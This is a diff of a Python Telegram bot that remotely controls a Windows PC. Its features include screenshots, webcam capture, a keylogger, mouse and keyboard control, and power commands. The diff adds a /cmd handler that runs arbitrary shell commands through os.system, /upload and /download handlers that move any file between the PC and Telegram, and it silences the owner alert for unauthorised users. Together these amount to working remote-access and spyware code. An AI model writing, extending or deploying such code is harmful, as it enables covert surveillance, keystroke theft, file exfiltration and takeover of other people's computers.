@@ -1,4 +1,5 @@
 ################################################################################ modules
+from dataclasses import replace
 from xml.dom.expatbuilder import parseString
 from inputData import getData, Data
 
@@ -83,6 +84,7 @@ ytResults = []
 # mouse
 curs = 50
 
+
 # functions
 def searchList(li, item):
     for i in range(len(li)):
@@ -97,22 +99,21 @@ print('🚀 Bot launched')
 
 
 
-################################################################################ start
-# __start
+################################################################################* __start
 @bot.message_handler(commands = ['start'])
 def Start(message):
     bot.send_message(message.chat.id, '🚀  Bot launched')
     bot.send_message(message.chat.id, 'Use  */help*  for more info', parse_mode = 'Markdown')
 
 
-################################################################################ help
-# __help
+
+################################################################################* help
 @bot.message_handler(commands = ['help'])
 def Help(message):
     bot.send_message(message.chat.id, '''
 *ℹ️  Information about bot:*\n\n
 *🚀  /start* - Start bot\n
-*ℹ️  /help* - Commands list\n
+*ℹ️   /help* - Commands list\n
 *🏞  /screenshot* - Take screenshot\n
 *📸  /webcam* - Take webcam photo\n
 *⌨️  /keylogger* - Start keylogger\n
@@ -123,9 +124,14 @@ def Help(message):
 *⏩  /next* - Next track\n
 *🌐  /browser* - Open URL in browser\n
 *🔍  /search* - Search in browser\n
-*🎥  /youtube* - Search in youtube\n
+*▶️  /youtube* - Search in youtube\n
 *📺  /fullscreen* - Fullscreenf for program\n
 *📺  /fullmovie* - Fullscreen for movie\n
+*⬆️  /download* - Download file from pc\n
+*⬇️  /upload* - Upload file to pc\n
+*👨‍💻  /cmd* \[command] - run command\n
+*🔼  /pgup* - Page up\n
+*🔽  /pgdn* - Page down\n
 *❌  /close* - Close current program\n
 *🖱  /mouse* - Set mouse position\n
 *🔒  /lock* - Lock your PC\n
@@ -160,8 +166,7 @@ mouse_keyboard.row(btncurs, btnCancel)
 
 
 
-################################################################################ screenshot
-# __screenshot
+################################################################################* __screenshot
 @bot.message_handler(commands = ['screenshot', 'screen'])
 def Screenshot(message):
     if not searchList(data.users, message.from_user.username):
@@ -176,8 +181,8 @@ def Screenshot(message):
     os.remove('Screenshot.png')
 
 
-################################################################################ webcam
-# __cam
+
+################################################################################! __webcam  |не буде працювати на інших пк|
 @bot.message_handler(commands = ['webcam', 'cam'])
 def Webcam(message):
     if not searchList(data.users, message.from_user.username):
@@ -191,8 +196,8 @@ def Webcam(message):
     os.remove('Webcam.png')
 
 
-################################################################################ keylogger
-# __keylogger
+
+################################################################################* __keylogger
 @bot.message_handler(commands = ['keylogger', 'logger'])
 def Keylogger(message):
     if not searchList(data.users, message.from_user.username):
@@ -225,8 +230,8 @@ def writeFile(keys):
         for key in keys:
             k = str(key).replace('\'', '')
             print(key)
-            # if k.find('space') > 0:
-            #     f.write('\n')
+            # if k.find('space') > 0:      # ???????????
+            #     f.write('\n')            # ???????????
             if k.find('enter') > 0:
                 f.write('[ENTER]\n')
             elif k.find('space') > 0:
@@ -238,7 +243,8 @@ def writeFile(keys):
                 f.write(k)
 
 
-################################################################################ write text
+
+################################################################################* __write text
 @bot.message_handler(commands = ['write', 'text'])
 def WriteText(message):
     if not searchList(data.users, message.from_user.username):
@@ -252,8 +258,7 @@ def WriteText_process(message):
     pyautogui.typewrite(text, interval = 0.05)
 
 
-################################################################################ volume
-# __volume
+################################################################################* __volume
 @bot.message_handler(commands = ['volume', 'vol'])
 def Volume(message):
     if not searchList(data.users, message.from_user.username):
@@ -283,8 +288,7 @@ def getVolumeEmoji(volume):
     else: return '🔊'
 
 
-################################################################################ brightness
-# __brightness
+################################################################################* __brightness
 @bot.message_handler(commands = ['brightness', 'bright'])
 def Brightness(message):
     if not searchList(data.users, message.from_user.username):
@@ -312,8 +316,8 @@ def getBrightnessEmoji(brightness):
     else: return '☀️'
 
 
-################################################################################ previous track
-# __prev
+
+################################################################################* __previous track
 @bot.message_handler(commands = ['previous', 'prev'])
 def Previous(message):
     if not searchList(data.users, message.from_user.username):
@@ -322,8 +326,8 @@ def Previous(message):
     bot.send_message(message.chat.id, '*⏪  Previous track*', parse_mode = 'Markdown')
 
 
-################################################################################ play/pause
-# __playpause
+
+################################################################################* __play/pause
 @bot.message_handler(commands = ['playpause', 'play', 'pause'])
 def Playpause(message):
     if not searchList(data.users, message.from_user.username):
@@ -332,8 +336,8 @@ def Playpause(message):
     bot.send_message(message.chat.id, '*⏯  Play/Pause track*', parse_mode = 'Markdown')
 
 
-################################################################################ next track
-# __next
+
+################################################################################* __next track
 @bot.message_handler(commands = ['next', 'skip'])
 def Next(message):
     if not searchList(data.users, message.from_user.username):
@@ -342,7 +346,8 @@ def Next(message):
     bot.send_message(message.chat.id, '*⏩  Next track*', parse_mode = 'Markdown')
 
 
-################################################################################ __browser
+
+################################################################################* __browser
 @bot.message_handler(commands = ['browser'])
 def Browser(message):
     if not searchList(data.users, message.from_user.username):
@@ -355,7 +360,8 @@ def Browser_process(message):
     webbrowser.open(url, new = 2)
 
 
-################################################################################ __search
+
+################################################################################* __search
 @bot.message_handler(commands = ['search'])
 def Search(message):
     if not searchList(data.users, message.from_user.username):
@@ -368,18 +374,8 @@ def Search_process(message):
     webbrowser.open(f'https://www.google.com/search?q={query}', new = 2)
 
 
-################################################################################ __youtube
-# @bot.message_handler(commands = ['youtube'])
-# def Youtube(message):
-#     if message.chat.id != user.ID:
-#         return Warn(message)
-#     bot.send_message(message.chat.id, 'Enter search query:', parse_mode = 'Markdown')
-#     bot.register_next_step_handler(message, Youtube_process)
-# def Youtube_process(message):
-#     query = message.text
-#     bot.send_message(message.chat.id, f'*🎥  Searching*  "{query}"', parse_mode = 'Markdown')
-#     webbrowser.open(f'https://www.youtube.com/results?search_query={query}', new = 2)
 
+################################################################################* __youtube
 @bot.message_handler(commands = ['youtube'])
 def Youtube(message):
     if not searchList(data.users, message.from_user.username):
@@ -414,7 +410,8 @@ def openInYoutube(link):
     webbrowser.open(link, new = 2)
 
 
-################################################################################ __fullscreen
+
+################################################################################* __fullscreen
 @bot.message_handler(commands = ['fullscreen'])
 def Fullscreen(message):
     if not searchList(data.users, message.from_user.username):
@@ -430,7 +427,8 @@ def FullscreenVideo(message):
     bot.send_message(message.chat.id, '📺  *Movie* is *fullscreen* now', parse_mode = 'Markdown')
 
 
-################################################################################ close
+
+################################################################################* __close
 @bot.message_handler(commands = ['close'])
 def Close(message):
     if not searchList(data.users, message.from_user.username):
@@ -439,8 +437,8 @@ def Close(message):
     pyautogui.hotkey('altleft', 'f4')
 
 
-################################################################################ lock
-# __lock
+
+################################################################################* __lock
 @bot.message_handler(commands = ['lock'])
 def Lock(message):
     if not searchList(data.users, message.from_user.username):
@@ -451,8 +449,8 @@ def Lock(message):
     bot.send_message(message.chat.id, '*🔒  Locked*', parse_mode = 'Markdown')
 
 
-################################################################################ shutdown
-# __shutdown
+
+################################################################################* __shutdown
 @bot.message_handler(commands = ['shutdown', 'sd'])
 def Shutdown(message):
     if not searchList(data.users, message.from_user.username):
@@ -472,8 +470,8 @@ def Shutdown_process(message):
     os.system(f'shutdown -s -t {seconds}')
 
 
-################################################################################ reboot
-# __reboot
+
+################################################################################* __reboot
 @bot.message_handler(commands = ['reboot', 'rb'])
 def Reeboot(message):
     if not searchList(data.users, message.from_user.username):
@@ -493,8 +491,8 @@ def Reboot_process(message):
     os.system(f'shutdown -r -t {seconds}')
 
 
-################################################################################ sleep
-# __sleep
+
+################################################################################* __sleep
 @bot.message_handler(commands = ['sleep'])
 def Sleep(message):
     if not searchList(data.users, message.from_user.username):
@@ -511,10 +509,12 @@ def Sleep_process(message):
     if not message.text.isdigit():
         return bot.send_message(message.chat.id, 'Time must be a number')
     seconds = int(message.text)
+    
     markupInlineCancelSleep = types.InlineKeyboardMarkup()
     btnCancelSleep = types.InlineKeyboardButton(text = 'Cancel', callback_data = 'cancelSleep')
     markupInlineCancelSleep.add(btnCancelSleep)
     bot.send_message(message.chat.id, f'💤  Sleeping in *{seconds}s*', parse_mode = 'Markdown', reply_markup = markupInlineCancelSleep)
+    
     for i in range(seconds):
         time.sleep(1)
         if sleepFlag:
@@ -523,8 +523,8 @@ def Sleep_process(message):
     os.system('shutdown /h')
 
 
-################################################################################ battery
-# __battery
+
+################################################################################* __battery
 @bot.message_handler(commands = ['battery'])
 def Battery(message):
     if not searchList(data.users, message.from_user.username):
@@ -548,8 +548,8 @@ def chargingEmoji(status):
     else: return '🔌'
 
 
-################################################################################ ip
-# __ip
+
+################################################################################* __ip
 @bot.message_handler(commands = ['ip'])
 def SendIP(message):
     if not searchList(data.users, message.from_user.username):
@@ -560,15 +560,15 @@ def getIP():
     return socket.gethostbyname(socket.gethostname())
 
 
-################################################################################ get id
-# __id
+
+################################################################################* __id
 @bot.message_handler(commands = ['getid', 'id'])
 def getID(message):
     bot.send_message(message.from_user.id, f'🆔  Your *ID* is *{message.from_user.id}*', parse_mode = 'Markdown')
 
 
-################################################################################ info
-# __info
+
+################################################################################* __info
 @bot.message_handler(commands = ['info', 'pc', 'pc_info'])
 def PcInfo(message):
     if not searchList(data.users, message.from_user.username):
@@ -589,8 +589,8 @@ def PcInfo(message):
     bot.send_message(message.chat.id, msg, parse_mode = "markdown")
 
 
-################################################################################ status
-# __status
+
+################################################################################* __status
 @bot.message_handler(commands = ['status', 'pc_status'])
 def PcStatus(message):
     if not searchList(data.users, message.from_user.username):
@@ -611,7 +611,7 @@ def PcStatus(message):
     msg += f'{getBrightnessEmoji(brightness)}  Brightness:  *{brightness}%*\n'
     msg += f'{getVolumeEmoji(volume)}  Volume:  *{volume}%*\n'
     bot.send_message(message.chat.id, msg, parse_mode = "markdown")
-def getSize(bytes, suffix="B"):
+def getSize(bytes, suffix = ""):
     factor = 1024
     for unit in ["", "K", "M", "G", "T", "P"]:
         if bytes < factor:
@@ -619,8 +619,8 @@ def getSize(bytes, suffix="B"):
         bytes /= factor
 
 
-################################################################################ stop
-# __stop
+
+################################################################################* __stop
 @bot.message_handler(commands = ['stop'])
 def stopBot(message):
     if not searchList(data.users, message.from_user.username):
@@ -632,23 +632,110 @@ def stopBot(message):
 
 
 
-################################################################################ / callback handler
-# __callback
+################################################################################? __upload file
+@bot.message_handler(commands = ['upload_file','upload'])
+def uploadFile(message):
+    if not searchList(data.users, message.from_user.username):
+        return Warn(message)
+    bot.send_message(message.chat.id,'💾 Send *file*',parse_mode = 'Markdown')
+    bot.register_next_step_handler(message,uploadFile_process)
+    
+def uploadFile_process(message): 
+    bot.send_chat_action(message.chat.id, 'typing')
+    try:
+        file_info = bot.get_file(message.document.file_id)
+        downloaded_file = bot.download_file(file_info.file_path)
+        src = os.path.expanduser('~') + '\\downloads\\' + message.document.file_name        
+        
+        with open(src, 'wb') as new_file:
+            new_file.write(downloaded_file)
+
+        bot.reply_to(message, f"✅ Successfully uploaded\n\n🛣️ Path to the file: {src}")
+    except:
+        bot.send_message(message.chat.id,'⚠️ Send the *document* as a *file*',parse_mode = 'Markdown')
+
+
+
+@bot.message_handler(commands = ['download_file','download','down'])
+def downloadFile(message):
+    if not searchList(data.users, message.from_user.username):
+        return Warn(message)
+    bot.send_message(message.chat.id,'🛣️ Enter the file path')
+    bot.register_next_step_handler(message,downloadFile_process)
+def downloadFile_process(message):
+    bot.send_chat_action(message.chat.id, 'typing')
+
+    try:
+        path = message.text
+        if os.path.exists(path):
+            bot.send_message(message.chat.id, "⌛️ File is loading, please wait...")
+            bot.send_chat_action(message.chat.id, 'upload_document')
+            file = open(path, 'rb')
+            bot.send_document(message.chat.id, file)
+            file.close()
+        else:
+            bot.send_message(message.chat.id, "⛔ The *path* is *incorrect* or the *file does not exist*",parse_mode = 'Markdown')
+    except:
+        bot.send_message(message.chat.id, "⛔ An *error* occurred, probably the path is not specified correctly",parse_mode = 'Markdown')
+
+
+
+################################################################################* __cmd
+@bot.message_handler(commands = ['cmd'])
+def cmd(message):
+    if not searchList(data.users, message.from_user.username):
+        return Warn(message)
+    
+    command = message.text.replace('/cmd','')
+    
+    if command == '' or command.find('cmd') == 1:
+        bot.send_message(message.chat.id, '⚠️  The */cmd* command requires a parameter', parse_mode = 'Markdown')
+    elif not os.system(command) and not command == 'cmd':
+        bot.send_message(message.chat.id, '*✅  Command success*', parse_mode = 'Markdown')
+    else:
+        bot.send_message(message.chat.id, '*⛔  Command failed*', parse_mode = 'Markdown')
+
+
+
+################################################################################* __PgUp
+@bot.message_handler(commands = ['pgup','up'])
+def PgUp(message):
+    if not searchList(data.users, message.from_user.username):
+        return Warn(message)
+    pyautogui.press('pgup')
+    bot.send_message(message.chat.id, '✅ Done', parse_mode = 'Markdown')
+
+
+
+################################################################################* __PgDn
+@bot.message_handler(commands = ['pgdn','dn'])
+def PgDn(message):
+    if not searchList(data.users, message.from_user.username):
+        return Warn(message)
+    pyautogui.press('pgdn')
+    bot.send_message(message.chat.id, '✅ Done', parse_mode = 'Markdown')
+
+
+
+################################################################################/ __callback handler
 @bot.callback_query_handler(func = lambda call: True)
 def TurnOffCallback(call):
     # shutdown
     if call.data == 'cancelShutdown':
         os.system('shutdown /a')
         bot.send_message(call.message.chat.id, '🛑  Shutdown *canceled*', parse_mode = 'Markdown')
+    
     # reboot
     elif call.data == 'cancelReboot':
         os.system('shutdown /a')
         bot.send_message(call.message.chat.id, '🛑  Reboot *canceled*', parse_mode = 'Markdown')
+    
     # sleep
     elif call.data == 'cancelSleep':
         global sleepFlag
         sleepFlag = True
         bot.send_message(call.message.chat.id, '🛑  Sleep *canceled*', parse_mode = 'Markdown')
+    
     # keylogger
     elif call.data == 'disableKeylogger':
         global keyloggerFlag, keys
@@ -663,34 +750,40 @@ def TurnOffCallback(call):
         os.remove('Logs.txt')
 
     # youtube
+    global ytResults
     for index in range(MAX_SEARCH_LEN):
-        global ytResults
         if len(ytResults) == 0: return
         if (call.data == f'ytSearch_{index}'):
             openInYoutube(ytResults[index]['link'])
 
 
-################################################################################ warn
-# __warn
+
+#!############################################################################### __warn | |
 def Warn(message):
-    bot.send_chat_action(message.chat.id, 'typing')
-    bot.send_chat_action(data.ID, 'typing')
-    # other user
-    bot.send_message(message.chat.id, '⚠️  *Warning*\n\n' + 'You are not allowed to use this bot', parse_mode = 'Markdown')
+    pass
+#     bot.send_chat_action(message.chat.id, 'typing')
+#     bot.send_chat_action(data.ID, 'typing')
+    
+#     # other user
+#     bot.send_message(message.chat.id, '⚠️  *Warning*\n\n' + 'You are not allowed to use this bot', parse_mode = 'Markdown')
 
-    # main
-    # msg = f'*⚠️  Someone just used  {message.text}*\n\n'
-    # if message.from_user.username != None:
-    #     msg += f'Username:  *@{message.from_user.username}*\n'
-    # if message.from_user.first_name != None:
-    #     msg += f'First Name:  *{message.from_user.first_name}*\n'
-    # if message.from_user.last_name != None:
-    #     msg += f'Last Name:  *{message.from_user.last_name}*\n'
-    # msg += f'User Id:  *{message.from_user.id}*\n\n'
-    # bot.send_message(data.ID, f'{msg}', parse_mode = 'Markdown')
-
+#     # main
+#     # msg = f'*⚠️  Someone just used  {message.text}*\n\n'
+#     # if message.from_user.username != None:
+#     #     msg += f'Username:  *@{message.from_user.username}*\n'
+#     # if message.from_user.first_name != None:
+#     #     msg += f'First Name:  *{message.from_user.first_name}*\n'
+#     # if message.from_user.last_name != None:
+#     #     msg += f'Last Name:  *{message.from_user.last_name}*\n'
+#     # msg += f'User Id:  *{message.from_user.id}*\n\n'
+#     # bot.send_message(data.ID, f'{msg}', parse_mode = 'Markdown')
+    
+    
+################################################################################? __mouse 
 @bot.message_handler(commands = ['mouse'])
 def mouseControl(message):
+    if not searchList(data.users, message.from_user.username):
+        return Warn(message)
     bot.send_message(message.chat.id, '🖱  *Mouse* is *now* *controlled*', reply_markup = mouse_keyboard, parse_mode = 'Markdown' )
     bot.register_next_step_handler(message, mouse_process)
     
@@ -723,13 +816,13 @@ def mouse_process(message):
         mouse.click()
         bot.register_next_step_handler(message, mouse_process)
         # screen_process(message)
+        
     elif message.text == '⛔':
         bot.send_message(message.chat.id, '🛑  *Mouse control* is terminated', parse_mode = 'Markdown' )
     elif message.text == 'Specify the cursor range':
         bot.send_chat_action(message.chat.id, 'typing')
         bot.send_message(message.chat.id, f"Specify a new cursor range, now this value is equal to *{str(curs)}px*", parse_mode = 'Markdown')
         bot.register_next_step_handler(message, mousecurs_settings)
-        
 def mousecurs_settings(message):
     global curs
     if message.text.isdigit():
@@ -739,7 +832,8 @@ def mousecurs_settings(message):
     else:
         bot.send_message(message.chat.id, "⛔ Incorrect value",reply_markup = mouse_keyboard)
         bot.register_next_step_handler(message, mouse_process)
-        
+
+
 
 ################################################################################ infinite polling
 bot.polling(none_stop = True)
